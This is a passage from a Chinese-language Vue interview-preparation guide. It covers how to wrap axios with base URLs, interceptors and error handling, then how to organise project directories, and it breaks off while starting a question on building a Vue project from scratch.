Vue项目中有封装过axios吗？主要是封装哪方面的？</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>封装六件事：<strong>基础配置</strong>（<code>baseURL</code>/超时）、<strong>请求拦截</strong>（注入 <code>token</code>、<code>traceId</code>、loading）、<strong>响应拦截</strong>（统一解包、错误码分发）、<strong>错误处理</strong>（401 跳登录、5xx 提示）、<strong>取消请求</strong>、<strong>重试与去重</strong></li>\\n<li>响应拦截里要区分三层错误：网络层（超时/断网）、<code>HTTP</code> 状态码、业务错误码 —— 提示文案和上报策略都不同</li>\\n<li>401 刷新 <code>token</code> 要做<strong>并发控制</strong>：多个请求同时 401 时只刷一次，其余排队等结果，否则会刷出一堆新 token</li>\\n<li>取消用 <code>AbortController</code>（新版 <code>axios</code> 支持 <code>signal</code>），路由切换时批量取消未完成请求</li>\\n<li>别把 <code>loading</code> 和业务弹窗写死在拦截器里 —— 留配置项让调用方决定，否则静默轮询请求也会闪 loading</li>\\n</ul>\\n<p>**<code>Vue</code> 项目里通常会二次封装 <code>axios</code>，核心是统一基础配置、请求拦截、响应处理和接口调用方式。**这样可以集中管理不同环境的 <code>baseURL</code>、超时时间和通用请求头，避免每个页面重复配置。请求拦截器一般统一携带 <code>token</code>，响应拦截器则按 <code>HTTP</code> 状态或约定的业务状态码处理登录、授权和异常。接口再按 <code>get</code>、<code>post</code> 封装并集中放入 <code>api.js</code>，页面只传业务参数；具体封装程度应以项目约定和使用便利为准。</p>\\n</section>\\n<h3 id=\\"axios是什么\\"><a class=\\"header-anchor\\" href=\\"#axios是什么\\">#</a> axios是什么</h3>\\n<p><code>axios</code> 是一个轻量的 <code>HTTP</code>客户端</p>\\n<p>基于 <code>XMLHttpRequest</code> 服务来执行 <code>HTTP</code> 请求，支持丰富的配置，支持 <code>Promise</code>，支持浏览器端和 <code>Node.js</code> 端。自<code>Vue</code>2.0起，尤大宣布取消对 <code>vue-resource</code> 的官方推荐，转而推荐 <code>axios</code>。现在 <code>axios</code> 已经成为大部分 <code>Vue</code> 开发者的首选</p>\\n<p><strong>特性</strong></p>\\n<ul>\\n<li>从浏览器中创建 <code>XMLHttpRequests</code></li>\\n<li>从 <code>node.js</code> 创建 <code>http</code>请求</li>\\n<li>支持 <code>Promise</code> API</li>\\n<li>拦截请求和响应</li>\\n<li>转换请求数据和响应数据</li>\\n<li>取消请求</li>\\n<li>自动转换<code>JSON</code> 数据</li>\\n<li>客户端支持防御<code>XSRF</code></li>\\n</ul>\\n<p><strong>基本使用</strong></p>\\n<p>安装</p>\\n<pre class=\\"language-js\\"><code>// 项目中安装\\nnpm install axios --S\\n// cdn 引入\\n&lt;script src=&quot;https://unpkg.com/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt;\\n</code></pre>\\n<p>导入</p>\\n<pre class=\\"language-js\\"><code>import axios from &#39;axios&#39;\\n</code></pre>\\n<p>发送请求</p>\\n<pre class=\\"language-js\\"><code>axios({        \\n  url:&#39;xxx&#39;,    // 设置请求的地址\\n  method:&quot;GET&quot;, // 设置请求方法\\n  params:{      // get请求使用params进行参数凭借,如果是post请求用data\\n    type: &#39;&#39;,\\n    page: 1\\n  }\\n}).then(res =&gt; {  \\n  // res为后端返回的数据\\n  console.log(res);   \\n})\\n</code></pre>\\n<p>并发请求<code>axios.all([])</code></p>\\n<pre class=\\"language-js\\"><code>function getUserAccount() {\\n    return axios.get(&#39;/user/12345&#39;);\\n}\\n\\nfunction getUserPermissions() {\\n    return axios.get(&#39;/user/12345/permissions&#39;);\\n}\\n\\naxios.all([getUserAccount(), getUserPermissions()])\\n    .then(axios.spread(function (res1, res2) { \\n    // res1第一个请求的返回的内容，res2第二个请求返回的内容\\n    // 两个请求都执行完成才会执行\\n}));\\n</code></pre>\\n<h3 id=\\"为什么要封装\\"><a class=\\"header-anchor\\" href=\\"#为什么要封装\\">#</a> 为什么要封装</h3>\\n<p><code>axios</code> 的 API 很友好，你完全可以很轻松地在项目中直接使用。</p>\\n<p>不过随着项目规模增大，如果每发起一次<code>HTTP</code>请求，就要把这些比如设置超时时间、设置请求头、根据项目环境判断使用哪个请求地址、错误处理等等操作，都需要写一遍</p>\\n<p>这种重复劳动不仅浪费时间，而且让代码变得冗余不堪，难以维护。为了提高我们的代码质量，我们应该在项目中二次封装一下 <code>axios</code> 再使用</p>\\n<p>举个例子：</p>\\n<pre class=\\"language-js\\"><code>axios(&#39;http://localhost:3000/data&#39;, {\\n  // 配置代码\\n  method: &#39;GET&#39;,\\n  timeout: 1000,\\n  withCredentials: true,\\n  headers: {\\n    &#39;Content-Type&#39;: &#39;application/json&#39;,\\n    Authorization: &#39;xxx&#39;,\\n  },\\n  transformRequest: [function (data, headers) {\\n    return data;\\n  }],\\n  // 其他请求配置...\\n})\\n.then((data) =&gt; {\\n  // todo: 真正业务逻辑代码\\n  console.log(data);\\n}, (err) =&gt; {\\n  // 错误处理代码  \\n  if (err.response.status === 401) {\\n  // handle authorization error\\n  }\\n  if (err.response.status === 403) {\\n  // handle server forbidden error\\n  }\\n  // 其他错误处理.....\\n  console.log(err);\\n});\\n</code></pre>\\n<p>如果每个页面都发送类似的请求，都要写一堆的配置与错误处理，就显得过于繁琐了</p>\\n<p>这时候我们就需要对<code>axios</code>进行二次封装，让使用更为便利</p>\\n<h3 id=\\"如何封装\\"><a class=\\"header-anchor\\" href=\\"#如何封装\\">#</a> 如何封装</h3>\\n<ul>\\n<li>封装的同时，你需要和 后端协商好一些约定，请求头，状态码，请求超时时间.......</li>\\n<li>设置接口请求前缀：根据开发、测试、生产环境的不同，前缀需要加以区分</li>\\n<li>请求头 : 来实现一些具体的业务，必须携带一些参数才可以请求(例如：会员业务)</li>\\n<li>状态码: 根据接口返回的不同<code>status</code> ， 来执行不同的业务，这块需要和后端约定好</li>\\n<li>请求方法：根据<code>get</code>、<code>post</code>等方法进行一个再次封装，使用起来更为方便</li>\\n<li>请求拦截器: 根据请求的请求头设定，来决定哪些请求可以访问</li>\\n<li>响应拦截器： 这块就是根据 后端`返回来的状态码判定执行不同业务</li>\\n</ul>\\n<p><strong>设置接口请求前缀</strong></p>\\n<p>利用<code>node</code>环境变量来作判断，用来区分开发、测试、生产环境</p>\\n<pre class=\\"language-js\\"><code>if (process.env.NODE_ENV === &#39;development&#39;) {\\n  axios.defaults.baseURL = &#39;http://dev.xxx.com&#39;\\n} else if (process.env.NODE_ENV === &#39;production&#39;) {\\n  axios.defaults.baseURL = &#39;http://prod.xxx.com&#39;\\n}\\n</code></pre>\\n<p>在本地调试的时候，还需要在<code>vue.config.js</code>文件中配置<code>devServer</code>实现代理转发，从而实现跨域</p>\\n<pre class=\\"language-js\\"><code>devServer: {\\n    proxy: {\\n      &#39;/proxyApi&#39;: {\\n        target: &#39;http://dev.xxx.com&#39;,\\n        changeOrigin: true,\\n        pathRewrite: {\\n          &#39;/proxyApi&#39;: &#39;&#39;\\n        }\\n      }\\n    }\\n  }\\n</code></pre>\\n<p><strong>设置请求头与超时时间</strong></p>\\n<p>大部分情况下，请求头都是固定的，只有少部分情况下，会需要一些特殊的请求头，这里将普适性的请求头作为基础配置。当需要特殊请求头时，将特殊请求头作为参数传入，覆盖基础配置</p>\\n<pre class=\\"language-js\\"><code>const service = axios.create({\\n    ...\\n    timeout: 30000,  // 请求 30s 超时\\n\\t  headers: {\\n        get: {\\n          &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded;charset=utf-8&#39;\\n          // 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来\\n        },\\n        post: {\\n          &#39;Content-Type&#39;: &#39;application/json;charset=utf-8&#39;\\n          // 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来\\n        }\\n  },\\n})\\n</code></pre>\\n<p><strong>封装请求方法</strong></p>\\n<p>先引入封装好的方法，在要调用的接口重新封装成一个方法暴露出去</p>\\n<pre class=\\"language-js\\"><code>// get 请求\\nexport function httpGet({\\n  url,\\n  params = {}\\n}) {\\n  return new Promise((resolve, reject) =&gt; {\\n    axios.get(url, {\\n      params\\n    }).then((res) =&gt; {\\n      resolve(res.data)\\n    }).catch(err =&gt; {\\n      reject(err)\\n    })\\n  })\\n}\\n\\n// post\\n// post请求\\nexport function httpPost({\\n  url,\\n  data = {},\\n  params = {}\\n}) {\\n  return new Promise((resolve, reject) =&gt; {\\n    axios({\\n      url,\\n      method: &#39;post&#39;,\\n      transformRequest: [function (data) {\\n        let ret = &#39;&#39;\\n        for (let it in data) {\\n          ret += encodeURIComponent(it) + &#39;=&#39; + encodeURIComponent(data[it]) + &#39;&amp;&#39;\\n        }\\n        return ret\\n      }],\\n      // 发送的数据\\n      data,\\n      // \\burl参数\\n      params\\n\\n    }).then(res =&gt; {\\n      resolve(res.data)\\n    })\\n  })\\n}\\n</code></pre>\\n<p>把封装的方法放在一个<code>api.js</code>文件中</p>\\n<pre class=\\"language-js\\"><code>import { httpGet, httpPost } from &#39;./http&#39;\\nexport const getorglist = (params = {}) =&gt; httpGet({ url: &#39;apps/api/org/list&#39;, params })\\n</code></pre>\\n<p>页面中就能直接调用</p>\\n<pre class=\\"language-js\\"><code>// .vue\\nimport { getorglist } from &#39;@/assets/js/api&#39;\\n\\ngetorglist({ id: 200 }).then(res =&gt; {\\n  console.log(res)\\n})\\n</code></pre>\\n<p>这样可以把<code>api</code>统一管理起来，以后维护修改只需要在<code>api.js</code>文件操作即可</p>\\n<p><strong>请求拦截器</strong></p>\\n<p>请求拦截器可以在每个请求里加上token，做了统一处理后维护起来也方便</p>\\n<pre class=\\"language-js\\"><code>// 请求拦截器\\naxios.interceptors.request.use(\\n  config =&gt; {\\n    // 每次发送请求之前判断是否存在token\\n    // 如果存在，则统一在http请求的header都加上token，这样后台根据token判断你的登录情况，此处token一般是用户完成登录后储存到localstorage里的\\n    token &amp;&amp; (config.headers.Authorization = token)\\n    return config\\n  },\\n  error =&gt; {\\n    return Promise.error(error)\\n  })\\n</code></pre>\\n<p><strong>响应拦截器</strong></p>\\n<p>响应拦截器可以在接收到响应后先做一层操作，如根据状态码判断登录状态、授权</p>\\n<pre class=\\"language-js\\"><code>// 响应拦截器\\naxios.interceptors.response.use(response =&gt; {\\n  // 如果返回的状态码为200，说明接口请求成功，可以正常拿到数据\\n  // 否则的话抛出错误\\n  if (response.status === 200) {\\n    if (response.data.code === 511) {\\n      // 未授权调取授权接口\\n    } else if (response.data.code === 510) {\\n      // 未登录跳转登录页\\n    } else {\\n      return Promise.resolve(response)\\n    }\\n  } else {\\n    return Promise.reject(response)\\n  }\\n}, error =&gt; {\\n  // 我们可以在这里对异常状态作统一处理\\n  if (error.response.status) {\\n    // 处理请求失败的情况\\n    // 对不同返回码对相应处理\\n    return Promise.reject(error.response)\\n  }\\n})\\n</code></pre>\\n<p><strong>小结</strong></p>\\n<ul>\\n<li>封装是编程中很有意义的手段，简单的<code>axios</code>封装，就可以让我们可以领略到它的魅力</li>\\n<li>封装 <code>axios</code> 没有一个绝对的标准，只要你的封装可以满足你的项目需求，并且用起来方便，那就是一个好的封装方案</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>支付页直接把所有响应体都按 <code>HTTP 200</code> 当成功，但后端约定业务码 <code>510</code> 表示未登录、<code>511</code> 表示未授权，这层封装应该怎样划分判断？</strong></p>\\n<p>响应拦截器先判断传输层状态，再依据双方约定的业务码分流登录、授权或正常数据。不能只看 <code>response.status === 200</code>，也不能擅自猜测业务码含义；约定变化时应集中修改映射，并保留拒绝分支让调用方感知失败。</p>\\n</li>\\n<li>\\n<p><strong>开发环境通过 <code>/proxyApi</code> 调接口正常，部署生产后却仍把请求发到代理路径，你会核对哪些前缀配置？</strong></p>\\n<p>先核对 <code>axios</code> 实例的 <code>baseURL</code> 是否按环境设置，再确认开发代理的 <code>pathRewrite</code> 只服务本地调试。<code>devServer.proxy</code> 不会替生产环境转发请求，生产地址必须由构建环境配置提供；环境识别错误会让全部接口指向错误域名。</p>\\n</li>\\n<li>\\n<p><strong>会员接口要求额外请求头，普通接口只需要通用头，团队却为每类请求创建一个 <code>axios</code> 实例，你会怎样收敛？</strong></p>\\n<p>把通用请求头和 <code>timeout</code> 放入基础实例，特殊请求头通过单次请求配置覆盖即可，请求拦截器再统一补充 <code>Authorization</code>。这样能减少实例配置漂移，但覆盖规则必须明确；若不同业务的认证和错误协议完全不同，强行共用一个实例反而会增加条件分支。</p>\\n</li>\\n<li>\\n<p><strong>搜索页连续请求时总在约 <code>30s</code> 后失败，控制台只有封装后的 <code>reject</code>，你会怎样区分超时、业务拒绝和服务端异常？</strong></p>\\n<p>先保留并检查 <code>axios</code> 原始错误中的请求、响应和配置，超时通常没有正常业务响应，服务端异常则可读取 <code>error.response</code>。响应拦截器应统一归类后继续 <code>Promise.reject()</code>，不要吞掉错误；否则页面只能看到悬空状态，无法针对重试或提示作决策。</p>\\n</li>\\n<li>\\n<p><strong>代码评审里 <code>httpGet()</code> 又手写了一层 <code>new Promise()</code>，只是把 <code>axios.get().then()</code> 转交给 <code>resolve/reject</code>，这层值得保留吗？</strong></p>\\n<p>如果没有数据转换、错误归一化或取消控制，这层 <code>new Promise()</code> 只是重复包装，直接返回 <code>axios</code> 的 <code>Promise</code> 更清楚。真正有价值的封装应集中处理前缀、请求头、超时和状态协议；过度包装还容易漏写 <code>catch</code>，造成调用一直得不到失败结果。</p>\\n</li>\\n<li>\\n<p><strong>一个团队主张所有接口都从页面里直接写 <code>URL</code>，另一个团队要求集中放进 <code>api.js</code>，在几十个接口持续变更时你怎么选？</strong></p>\\n<p>接口地址和调用签名持续变化时，应按业务模块集中导出请求函数，让页面只传业务参数并消费结果。这样修改路径或协议时不必遍历所有组件，但也不宜把全部接口堆进单个巨型文件；规模扩大后应继续按页面或领域拆分。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_51-说下你的vue项目的目录结构-如果是大型项目你该怎么划分结构和划分组件呢\\"><a class=\\"header-anchor\\" href=\\"#_51-说下你的vue项目的目录结构-如果是大型项目你该怎么划分结构和划分组件呢\\">#</a> 51 说下你的vue项目的目录结构，如果是大型项目你该怎么划分结构和划分组件呢</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>小项目按<strong>类型</strong>分（<code>views</code>/<code>components</code>/<code>api</code>/<code>store</code>/<code>utils</code>），一眼能找到东西</li>\\n<li>大项目按<strong>业务模块</strong>分（<code>modules/order/</code> 下自带 <code>views</code>/<code>components</code>/<code>api</code>/<code>store</code>），改一个功能只在一个目录里动</li>\\n<li>判断信号：<code>components</code> 目录超过几十个文件、改一个需求要跨五六个目录，就该按模块拆了</li>\\n<li>组件分三层：<strong>基础组件</strong>（无业务，纯 UI）、<strong>业务组件</strong>（含业务逻辑，模块内复用）、<strong>页面组件</strong>（对应路由）</li>\\n<li>配套约定：路径别名（<code>@/</code>）、每个模块有 <code>index.ts</code> 统一出口、跨模块只能通过出口引用不能深入内部</li>\\n</ul>\\n<p><strong>小型 <code>Vue</code> 项目我会按文件类型组织，大型项目则按业务模块拆分，并把关联代码放在一起。</strong> 常见目录包括 <code>pages</code>、<code>components</code>、<code>api</code>、<code>store</code> 和 <code>utils</code>；模块变大后，每个业务目录可以拥有自己的页面、组件和状态。模块内部用相对路径，公共资源从根目录引用，这样移动整个模块时改动更少。每个模块再通过 <code>index.js</code> 提供唯一出口，外部不能直接引用其内部文件，避免重构时牵一发动全身。</p>\\n</section>\\n<h3 id=\\"为什么要划分\\"><a class=\\"header-anchor\\" href=\\"#为什么要划分\\">#</a> 为什么要划分</h3>\\n<p>使用<code>vue</code>构建项目，项目结构清晰会提高开发效率，熟悉项目的各种配置同样会让开发效率更高</p>\\n<p>在划分项目结构的时候，需要遵循一些基本的原则：</p>\\n<ul>\\n<li>文件夹和文件夹内部文件的语义一致性</li>\\n<li>单一入口/出口</li>\\n<li>就近原则，紧耦合的文件应该放到一起，且应以相对路径引用</li>\\n<li>公共的文件应该以绝对路径的方式从根目录引用</li>\\n<li><code>/src</code> 外的文件不应该被引入</li>\\n</ul>\\n<p><strong>文件夹和文件夹内部文件的语义一致性</strong></p>\\n<p>我们的目录结构都会有一个文件夹是按照路由模块来划分的，如<code>pages</code>文件夹，这个文件夹里面应该包含我们项目所有的路由模块，并且仅应该包含路由模块，而不应该有别的其他的非路由模块的文件夹</p>\\n<p>这样做的好处在于一眼就从 <code>pages</code>文件夹看出这个项目的路由有哪些</p>\\n<p><strong>单一入口/出口</strong></p>\\n<p>举个例子，在<code>pages</code>文件夹里面存在一个<code>seller</code>文件夹，这时候<code>seller</code> 文件夹应该作为一个独立的模块由外部引入，并且 <code>seller/index.js</code> 应该作为外部引入 seller 模块的唯一入口</p>\\n<pre class=\\"language-js\\"><code>// 错误用法\\nimport sellerReducer from &#39;src/pages/seller/reducer&#39;\\n\\n// 正确用法\\nimport { reducer as sellerReducer } from &#39;src/pages/seller&#39;\\n</code></pre>\\n<p>这样做的好处在于，无论你的模块文件夹内部有多乱，外部引用的时候，都是从一个入口文件引入，这样就很好的实现了隔离，如果后续有重构需求，你就会发现这种方式的优点</p>\\n<p><strong>就近原则，紧耦合的文件应该放到一起，且应以相对路径引用</strong></p>\\n<p>使用相对路径可以保证模块内部的独立性</p>\\n<pre class=\\"language-js\\"><code>// 正确用法\\nimport styles from &#39;./index.module.scss&#39;\\n// 错误用法\\nimport styles from &#39;src/pages/seller/index.module.scss&#39;\\n</code></pre>\\n<p>举个例子</p>\\n<p>假设我们现在的 seller 目录是在 <code>src/pages/seller</code>，如果我们后续发生了路由变更，需要加一个层级，变成 <code>src/pages/user/seller</code>。</p>\\n<p>如果我们采用第一种相对路径的方式，那就可以直接将整个文件夹拖过去就好，<code>seller</code> 文件夹内部不需要做任何变更。</p>\\n<p>但是如果我们采用第二种绝对路径的方式，移动文件夹的同时，还需要对每个 <code>import</code> 的路径做修改</p>\\n<p><strong>公共的文件应该以绝对路径的方式从根目录引用</strong></p>\\n<p>公共指的是多个路由模块共用，如一些公共的组件，我们可以放在<code>src/components</code>下</p>\\n<p>在使用到的页面中，采用绝对路径的形式引用</p>\\n<pre class=\\"language-js\\"><code>// 错误用法\\nimport Input from &#39;../../components/input&#39;\\n// 正确用法\\nimport Input from &#39;src/components/input&#39;\\n</code></pre>\\n<p>同样的，如果我们需要对文件夹结构进行调整。将 <code>/src/components/input</code> 变成 <code>/src/components/new/input</code>，如果使用绝对路径，只需要全局搜索替换</p>\\n<p>再加上绝对路径有全局的语义，相对路径有独立模块的语义</p>\\n<p><strong>src 外的文件不应该被引入</strong></p>\\n<p><code>vue-cli</code>脚手架已经帮我们做了相关的约束了，正常我们的前端项目都会有个<code>src</code>文件夹，里面放着所有的项目需要的资源，<code>js</code>,<code>css</code>, <code>png</code>, <code>svg</code> 等等。<code>src</code> 外会放一些项目配置，依赖，环境等文件</p>\\n<p>这样的好处是方便划分项目代码文件和配置文件</p>\\n<h3 id=\\"目录结构\\"><a class=\\"header-anchor\\" href=\\"#目录结构\\">#</a> 目录结构</h3>\\n<p>单页面目录结构</p>\\n<pre class=\\"language-js\\"><code>project\\n│  .browserslistrc\\n│  .env.production\\n│  .eslintrc.js\\n│  .gitignore\\n│  babel.config.js\\n│  package-lock.json\\n│  package.json\\n│  README.md\\n│  vue.config.js\\n│  yarn-error.log\\n│  yarn.lock\\n│\\n├─public\\n│      favicon.ico\\n│      index.html\\n│\\n|-- src\\n    |-- components\\n        |-- input\\n            |-- index.js\\n            |-- index.module.scss\\n    |-- pages\\n        |-- seller\\n            |-- components\\n                |-- input\\n                    |-- index.js\\n                    |-- index.module.scss\\n            |-- reducer.js\\n            |-- saga.js\\n            |-- index.js\\n            |-- index.module.scss\\n        |-- buyer\\n            |-- index.js\\n        |-- index.js\\n</code></pre>\\n<p>多页面目录结构</p>\\n<pre class=\\"language-js\\"><code>my-vue-test:.\\n│  .browserslistrc\\n│  .env.production\\n│  .eslintrc.js\\n│  .gitignore\\n│  babel.config.js\\n│  package-lock.json\\n│  package.json\\n│  README.md\\n│  vue.config.js\\n│  yarn-error.log\\n│  yarn.lock\\n│\\n├─public\\n│      favicon.ico\\n│      index.html\\n│\\n└─src\\n    ├─apis //接口文件根据页面或实例模块化\\n    │      index.js\\n    │      login.js\\n    │\\n    ├─components //全局公共组件\\n    │  └─header\\n    │          index.less\\n    │          index.vue\\n    │\\n    ├─config //配置（环境变量配置不同passid等）\\n    │      env.js\\n    │      index.js\\n    │\\n    ├─contant //常量\\n    │      index.js\\n    │\\n    ├─images //图片\\n    │      logo.png\\n    │\\n    ├─pages //多页面vue项目，不同的实例\\n    │  ├─index //主实例\\n    │  │  │  index.js\\n    │  │  │  index.vue\\n    │  │  │  main.js\\n    │  │  │  router.js\\n    │  │  │  store.js\\n    │  │  │\\n    │  │  ├─components //业务组件\\n    │  │  └─pages //此实例中的各个路由\\n    │  │      ├─amenu\\n    │  │      │      index.vue\\n    │  │      │\\n    │  │      └─bmenu\\n    │  │              index.vue\\n    │  │\\n    │  └─login //另一个实例\\n    │          index.js\\n    │          index.vue\\n    │          main.js\\n    │\\n    ├─scripts //包含各种常用配置，工具函数\\n    │  │  map.js\\n    │  │\\n    │  └─utils\\n    │          helper.js\\n    │\\n    ├─store //vuex仓库\\n    │  │  index.js\\n    │  │\\n    │  ├─index\\n    │  │      actions.js\\n    │  │      getters.js\\n    │  │      index.js\\n    │  │      mutation-types.js\\n    │  │      mutations.js\\n    │  │      state.js\\n    │  │\\n    │  └─user\\n    │          actions.js\\n    │          getters.js\\n    │          index.js\\n    │          mutation-types.js\\n    │          mutations.js\\n    │          state.js\\n    │\\n    └─styles //样式统一配置\\n        │  components.less\\n        │\\n        ├─animation\\n        │      index.less\\n        │      slide.less\\n        │\\n        ├─base\\n        │      index.less\\n        │      style.less\\n        │      var.less\\n        │      widget.less\\n        │\\n        └─common\\n                index.less\\n                reset.less\\n                style.less\\n                transition.less\\n</code></pre>\\n<p><strong>小结</strong></p>\\n<p>项目的目录结构很重要，因为目录结构能体现很多东西，怎么规划目录结构可能每个人有自己的理解，但是按照一定的规范去进行目录的设计，能让项目整个架构看起来更为简洁，更加易用</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>卖家页独有的输入框被放进顶层 <code>src/components</code>，买家页从未使用；评审说只要是组件就该全局共享，你认可吗？</strong></p>\\n<p>不认可，单页面结构中页面专属组件应就近放在 <code>pages/seller/components</code>，顶层 <code>components</code> 留给真正跨页面复用的组件。按组件类型一律上提会模糊归属，并让公共目录不断膨胀；只有复用边界稳定后再迁移更合适。</p>\\n</li>\\n<li>\\n<p><strong>多页面项目同时有主站和登录实例，各自需要独立入口、路由和状态，<code>src/pages</code> 应怎样组织才不会互相污染？</strong></p>\\n<p>每个实例应在 <code>pages</code> 下拥有自己的 <code>index.js</code>、<code>index.vue</code>、<code>main.js</code>，需要时再配置独立的 <code>router.js</code> 和 <code>store.js</code>。实例内的路由页面与业务组件继续放在该目录下；真正公共的组件、配置和工具才上提到共享层。</p>\\n</li>\\n<li>\\n<p><strong>三个页面都要调用接口，但每个组件里散落着 <code>URL</code>、环境域名和参数拼装，目录层面怎么调整？</strong></p>\\n<p>将接口按页面或业务模块归入 <code>src/apis</code>，环境相关值放入 <code>config</code>，页面只引用明确的接口函数。这样修改域名或接口路径时有集中入口；如果 <code>apis/index.js</code> 变成无边界汇总文件，仍需继续拆成如 <code>login.js</code> 等模块。</p>\\n</li>\\n<li>\\n<p><strong>线上只在生产环境出现认证地址错误，开发环境始终正常，你会优先检查目录中的哪些文件及职责边界？</strong></p>\\n<p>优先检查 <code>.env.production</code>、<code>src/config/env.js</code> 与 <code>config/index.js</code> 是否正确映射生产配置，再确认业务页面没有绕过配置层硬编码地址。开发代理可能掩盖错误，因此还要核对 <code>vue.config.js</code> 仅承担本地构建与代理职责，不能代替生产配置。</p>\\n</li>\\n<li>\\n<p><strong>团队争论动画、基础样式和组件样式是全部放进一个 <code>global.less</code>，还是按层次拆目录，你会怎样取舍？</strong></p>\\n<p>规模较小时单文件能工作，但已有多页面和多类样式时，应在 <code>styles</code> 下区分 <code>base</code>、<code>animation</code> 与组件级公共样式，局部页面样式仍跟随页面。分层能表达作用域并降低误改风险，代价是入口文件必须明确控制引入顺序。</p>\\n</li>\\n<li>\\n<p><strong>用户模块的 <code>Vuex</code> 文件已经包含 <code>actions</code>、<code>getters</code>、<code>mutations</code> 和 <code>state</code>，继续全部塞进根 <code>store/index.js</code> 会有什么维护问题？</strong></p>\\n<p>应按领域保留 <code>store/user</code>、<code>store/index</code> 等模块目录，由各自入口组合相关状态文件，再由根仓库统一注册。全部堆进根文件会让业务边界消失并增加命名冲突；模块很小时也不必机械拆满所有文件，应以可读性为界。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_52-从0到1自己构架一个vue项目-说说有哪些步骤、哪些重要插件、目录结构你会怎么组织\\"><a class=\\"header-anchor\\" href=\\"#_52-从0到1自己构架一个vue项目-说说有哪些步骤、哪些重要插件、目录结构你会怎么组织\\">#</a> 52 从0到1自己构架一个vue项目，说说有哪些步骤、哪些重要插件、目录结构你会怎么组织</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>步骤：脚手架初始化（<code>create-vue</code> + <code>Vite</code>）→ 规范工具链 → 目录与别名 → 路由与权限 → 请求层 → 状态管理 → UI 库与主题 → 环境变量与构建部署</li>\\n<li>规范工具链是最该一开始就装好的：<code>ESLint</code> + <code>Prettier</code> + <code>stylelint</code> + <code>husky</code> + <code>lint-staged</code> + <code>commitlint</code></li>\\n<li>必备插件：<code>vue-router</code>、<code>Pinia</code>、<code>axios</code>、<code>unplugin-auto-import</code>/<code>unplugin-vue-components</code>（按需引入）、<code>vite-plugin-svg-icons</code></li>\\n<li>工程约定要先定：路径别名、环境变量分层（<code>.env.development</code>/<code>.env.production</code>）、<code>Git</code> 分支和提交规范</li>\\n<li>别一开始就上全套 —— 权限、埋点、微前端这些等真有需求再加，过度设计的脚手架没人愿意维护</li>\\n</ul>\\n<p><strong>我会先用 <code>create-vue</code> 和 <code>Vite</code> 建好项目，再补齐路由、状态、请求、代码规范和提交规范。</strong> 核心依赖保留 <code>vue-router</code>、<code>Pinia</code> 和 <code>axios</code>，界面库根据业务选择，进度条、图标及 <code>VueUse</code> 等工具有需求再引入。工程约束用 <code>ESLint</code>、<code>Prettier</code>、<code>husky</code>、<code>lint-staged</code> 和 <code>commitlint</code>，因为规范越晚补，存量代码的改造成本越高。目录通常拆成 <code>api</code>、<code>components</code>、<code>layout</code>、<code>router</code>、<code>store</code>、<code>utils</code> 和 <code>views</code>，公共能力与页面业务分开放。</p>\\n</section>\\n<p>综合实践类题目，考查实战能力。没有什么绝对的正确答案，把平时工作的重点有条理的描述一下即可</p>\\n<p><strong>思路</strong></p>\\n<ul>\\n<li>构建项目，创建项目基本结构</li>\\n<li>引入必要的插件：</li>\\n<li>代码规范：<code>prettier</code>，<code>eslint</code></li>\\n<li>提交规范：<code>husky</code>，lint-staged`</li>\\n<li>其他常用：<code>svg-loader</code>，<code>vueuse</code>，<code>nprogress</code></li>\\n<li>常见目录结构</li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>从<code>0</code>创建一个项目我大致会做以下事情：项目构建、引入必要插件、代码规范、提交规范、常用库和组件</li>\\n<li>目前<code>vue3</code>项目我会用<code>vite</code>或者<code>create-vue</code>创建项目</li>\\n<li>接下来引入必要插件：路由插件<code>vue-router</code>、状态管理<code>vuex/pinia</code>、<code>ui</code>库我比较喜欢<code>element-plu</code>s和<code>antd-vue</code>、<code>http</code>工具我会选<code>axios</code></li>\\n<li>其他比较常用的库有<code>vueuse</code>，<code>nprogress</code>，图标可以使用<code>vite-svg-loader</code></li>\\n<li>下面是代码规范：结合<code>prettier</code>和<code>eslint</code>即可</li>\\n<li>最后是提交规范，可以使用<code>husky</code>，<code>lint-staged</code>，<code>commitlint</code></li>\\n<li>目录结构我有如下习惯： <code>.vscode</code>：用来放项目中的 <code>vscode</code> 配置</li>\\n</ol>\\n<ul>\\n<li><code>plugins</code>：用来放 <code>vite</code> 插件的 <code>plugin</code> 配置</li>\\n<li><code>public</code>：用来放一些诸如 页头<code>icon</code> 之类的公共文件，会被打包到<code>dist</code>根目录下</li>\\n<li><code>src</code>：用来放项目代码文件</li>\\n<li><code>api</code>：用来放<code>http</code>的一些接口配置</li>\\n<li><code>assets</code>：用来放一些 <code>CSS</code> 之类的静态资源</li>\\n<li><code>components</code>：用来放项目通用组件</li>\\n<li><code>layout</code>：用来放项目的布局</li>\\n<li><code>router</code>：用来放项目的路由配置</li>\\n<li><code>store</code>：用来放状态管理<code>Pinia</code>的配置</li>\\n<li><code>utils</code>：用来放项目中的工具方法类</li>\\n<li><code>views</code>：用来放项目的页面文件</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>你接手一个只有登录页的 <code>Vue 3</code> 新项目，产品要求两周后扩成后台系统；现在只装 <code>Vite</code> 和 <code>UI</code> 库就开写，缺口在哪里？</strong></p>\\n<p>应先用 <code>Vite</code> 或 <code>create-vue</code> 建立基础工程，再按已知需求补齐 <code>vue-router</code>、<code>Pinia</code> 或 <code>Vuex</code>、<code>HTTP</code> 